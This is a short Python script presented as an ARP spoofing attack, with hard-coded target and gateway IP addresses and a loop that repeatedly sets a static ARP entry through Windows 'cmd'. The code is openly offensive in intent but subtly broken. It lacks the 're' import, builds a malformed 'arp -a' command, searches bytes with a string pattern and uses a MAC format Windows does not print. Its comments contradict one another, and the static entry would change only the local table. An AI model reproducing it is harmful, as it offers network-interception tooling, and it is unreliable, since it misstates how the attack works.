import subprocess
import time

def arp_spoof(target_ip, gateway_ip):
    # Step 1: Get the MAC address of the target IP
    arp_request = 'arp -a' + target_ip
    print("Getting ARP table...")
    output = subprocess.check_output(['cmd', '/c', arp_request])
    print(output)
    
    # Step 2: Parse the MAC address from the ARP output
    mac_address = re.search(r'([a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2}:[a-f0-9]{2})', output).group(1)
    print("The MAC address of " + target_ip + " is: " + mac_address)
    
    # Step 3: Spoof the ARP table to make the gateway's IP point to our MAC
    arp_spoof = 'arp -s ' + gateway_ip + ' ' + mac_address
    print("Spoofing ARP tables...")
    subprocess.call(['cmd', '/c', arp_spoof])
    
    # Step 4: Continuously spoof the target's IP to our MAC until stopped
    while True:
        try:
            print("Spoofing " + target_ip + "...")
            subprocess.call(['cmd', '/c', arp_spoof])
            time.sleep(2)  # Sleep for some time before the next spoof attempt
        except KeyboardInterrupt:
            break
        
    print("Spoofing attack stopped.")
    
if __name__ == '__main__':
    target_ip = "198.62.20.1"
    gateway_ip = "198.30.20.1"
    arp_spoof(target_ip, gateway_ip)